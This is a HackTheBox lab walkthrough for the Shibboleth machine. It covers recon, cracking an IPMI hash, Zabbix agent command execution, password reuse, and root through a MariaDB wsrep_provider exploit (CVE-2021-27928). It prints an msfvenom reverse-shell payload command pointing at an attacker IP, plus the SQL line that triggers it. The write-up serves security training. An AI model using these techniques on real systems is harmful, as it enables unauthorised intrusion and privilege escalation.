---
layout: post
title: "HTB: SHIBBOLETH (10.10.11.124)"
description: "Shibboleth is a medium machine from HackTheBox created by knightmare & mrb3n. It starts off with a static website template. We will find a clue to look into BMC automation then find IPMI listening on UDP port 632. I will use Metasploit to leak a hash from IPMI, and crack it to get creds. This creds will allow me to log into Zabbix instance. Once in Zabbix i will use the Zabbix agent to execute commands and gain initial foothold. I will use credential reuse to pivots the next user. To get root, I’ll exploit a CVE in MariaDB / MySQL."
tags: [hackthebox, htb, boot2root, writeup, write-up, linux, snmp, zabbix, command execution, access control lists, shibboleth, nmap, gobuster, bloodhoud,]
image: "/assets/img/shibboleth/shibboleth_feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

We run NMAP with default scripts and enumerate version and save it in the directory called nmap.
```nmap
$ nmap -sC -sV -oA nmap/shibboleth 10.10.11.124
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-31 02:42 EDT
Nmap scan report for 10.10.11.124
Host is up (0.67s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.75 seconds
```
From the result we only see one port open. Also, we note nmap was not redirected. Lets add shibboleth.htb to our hosts file and run the scan again.

```nmap
# Nmap 7.92 scan initiated Thu Mar 31 06:02:40 2022 as: nmap -sC -sV -vvv -oA nmap/shibboleth 10.10.11.124
Nmap scan report for 10.10.11.124
Host is up, received echo-reply ttl 63 (0.69s latency).
Scanned at 2022-03-31 06:02:41 EDT for 27s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 31 06:03:08 2022 -- 1 IP address (1 host up) scanned in 28.51 seconds
Based on the Apache/2.4.41 version, the host is likely running Ubuntu Focal (20.04LTS).
```
### Website - TCP 80
#### Site

Manually browsing to shibboleth.htb we see what seems like a default bootstrap website template.

![default bootstrap website template](/assets/img/shibboleth/default bootstrap.png)

#### Tech Stack
The response headers don’t give much info at all.

But the footer provides some interesting information that we need to take note of

![Footer](/assets/img/shibboleth/footer.png)

### Directory Brute Force

Trying directory Bruteforce using gobuster we get two directories.
```bash
└─$ gobuster dir -u http://shibboleth.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shibboleth.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/02 03:30:55 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]
/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/]
```
Under /forms we get a contact.php which gives an error. Checking out the validation js code under /assets I note the contact form application logic is not implemented.


The PHP Email Form Library is missing sigh!.. a dead end, so let's move on.

Thinking back to the footer text. Lets find additional vhosts using ffuf
```lua

└─$ ffuf -u http://shibboleth.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.shibboleth.htb" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shibboleth.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.shibboleth.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

monitor                 [Status: 200, Size: 3689, Words: 192, Lines: 30]
monitoring              [Status: 200, Size: 3689, Words: 192, Lines: 30]
zabbix                  [Status: 200, Size: 3689, Words: 192, Lines: 30]
```
We get:

- `monitor.shibboleth.htb`
- `monitoring.shibboleth.htb`
- `zabbix.shibboleth.htb`

#### Site
I will add all three to the hosts file and visit the pages.

All three `subdomains` redirect to the same login page

![zabbix login page](/assets/img/shibboleth/zabbix_login_page.png)

### Zabbix

Zabbix is an open-source, real-time monitoring tool for servers, networks and virtual machines and cloud services, which can be configured by using XML based templates.

I tested all the default password and weak credentials but none worked.

#### UDP Port 623
A little research reminded me I never checked for any UDP ports open. Lets do just that.

Bingo! port 623 is open.

![UDP Port 623](/assets/img/shibboleth/623.png)

I found out ASF stands for Alert Standart Format, which is a DMTF standard for remote monitoring, management and control of computer systems.


Further research pointed me to Metasploit Framework's ipmi_version module which identifies a local BMC that supports IPMI version 2.0.

![IPMIV2](/assets/img/shibboleth/ipimiv2.png)

 According to this Rapid7 Blog Post We can also be able to dump the hashes of valid accounts using the Metasploit module ipmi_dumphashes.

Lets fire it up

![Admin hash](/assets/img/shibboleth/adminhash.png)

And we get a hash. We will copy the hash and save it in a file called hashes and attempt to crack it with hashcat.

Hashcat new version can actually identify the hash type without having to provide the mode as seen below

![identifying hash](/assets/img/shibboleth/identifyinghash.png)

Hashcat cracked the hash in no time.

![Cracked Hash](/assets/img/shibboleth/cracked has.png)

Our administrator really loves pumpkin pie 😎😎

Now we have a valid username:password, we can try log in to Zabbix

<!-- {% include trunc_image.html src="/assets/img/shibboleth/tryusing the credentials.png" alt="/assets/img/shibboleth/tryusing the credentials.png" ext="png" trunc=400 %} -->

![try using the credentials](/assets/img/shibboleth/tryusing the credentials.png)

We get redirected to Zabbix dashboard, sweet!

![And We login](/assets/img/shibboleth/andwelogin.png)


## Shell as Zabbix
#### Exploiting Zabbix
I now have to find a way to execute commands on zabbix agents.

Luckily i stumbled upon this [Post](https://stackoverflow.com/questions/24222086/how-to-run-command-on-zabbix-agents){:target="_blank"}.

We have to create a new item. Insert a command to spawn a reverse shell in the "Key" field. But before we get the revers shell, i have to test if we actually have RCE.

We shall do this by initiating a ping command back to our box. (always a good move :) )

#### Testing RCE

![Testing RCE](/assets/img/shibboleth/testing rce.png)

#### RCE confirmed

![Command execution](/assets/img/shibboleth/commandexecution.png)

About time we get our shell

![Getting a foothold on the box](/assets/img/shibboleth/getting a foothold on the box.png)

Finally we are on the box as Zabbix user

![Access as Zabbix](/assets/img/shibboleth/access as zabbix.png)
## Shell as ipmi-svc
There’s a single home directory on Shibboleth `ipmi-svc` which contains the `user falg` but Zabbix user cannot access it.

```
zabbix@shibboleth:/home/ipmi-svc$ cat user.txt
cat: user.txt: Permission denied
```

To obtain the user flag we need to operate as ipmi-svc user.

```lua
zabbix@shibboleth:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
```
### Password reuse

Lets see if our "pumpkin pie loving" admin reused their password.

```lua
zabbix@shibboleth:/$ su ipmi-svc
Password:
ipmi-svc@shibboleth:/$
ipmi-svc@shibboleth:/$ whoami
ipmi-svc
```
Sure enough they did and we are ipmi-svc user. We can also read the user flag.

![User Flag](/assets/img/shibboleth/userflag.png)

## Shell as root
### Enumeration
#### MySQL

Checking at the running processes we can see there is mysql running.

I will check and see if I can get the credentials from Zabbix config file which resides in `/etc/zabbix`. The file is quite large and most of it contains default values and so many commented out.

![DB Password](/assets/img/shibboleth/dbpassword.png)

Awesome! lets log in to the mysql service

![MYSQL DB Version](/assets/img/shibboleth/msqldb version.png)

### CVE-2021-27928
#### Indentify

Looking at the MariaDB version online I find a Vulnerability (CVE-2021-27928) associated with it.

To take advantage of this vulnerability, I will need to create a shared object file (a type of DLL specifically for Linux systems) using the msfvenom tool and transfer the payload file to the target machine via wget as described in this [PoC](https://github.com/Al1ex/CVE-2021-27928){:target="_blank"}.


```json
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=9003 -f elf-so -o george.so
```
![exploiting mariadb](/assets/img/shibboleth/exploiting mariadb.png)

Now we spin up a netcat session and wait for a connection.

![NC Session](/assets/img/shibboleth/ncsession.png)

#### Execute:

```lua
SET GLOBAL wsrep_provider="/tmp/george.so";
```

in the MariaDB server to trigger the payload.

![exploiting mariadb](/assets/img/shibboleth/exploitmariadb.png)

Eureka!! We have root access.

![And we are root](/assets/img/shibboleth/and we are root.png)

********* And that was fun!!. Thank you for taking time to read my blog ************
